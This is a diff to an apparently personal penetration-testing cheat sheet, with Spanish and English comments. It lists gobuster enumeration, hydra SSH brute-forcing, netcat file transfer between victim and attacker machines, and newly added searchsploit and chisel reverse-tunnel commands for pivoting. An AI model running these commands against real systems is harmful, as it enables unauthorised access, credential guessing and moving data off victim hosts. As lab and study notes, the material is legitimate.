@@ -13,7 +13,7 @@ gobuster dir -u http://10.65.187.137 -w /usr/share/wordlists/dirbuster/directory
 gobuster vhost -u http://IP_OBJETIVO -w subdomains.txt
 
 # Transfer files
-python3 -m http.server 80
+python3 -m http.server 80 (wget http://<ip_local>/<filename>)
 nc -lp 4444 > archivo_recibido.txt # victims machine
 nc -w 3 [IP_VICTIMA] 4444 < archivo_a_enviar.txt # attackers machine
 
@@ -101,6 +101,19 @@ $ hydra -L users.txt -P passwords.txt 192.168.1.12 ssh -V -f # put ip's victims 
 # SUDOERS
 ```bash
 sudo -l
+
+```
+# Searchsploit
+```bash
+searchsploit <any_software>
+
+
+```
+# CHISEL
+```bash
+./chisel server --reverse -p 1234 # server
+./chisel client 192.168.1.14:1234 R:socks # client
+# modificar el archivo proxychains4.conf con la ip asignada por chisel (ex. socks5 127.0.0.1 1080)
 
 ```
 
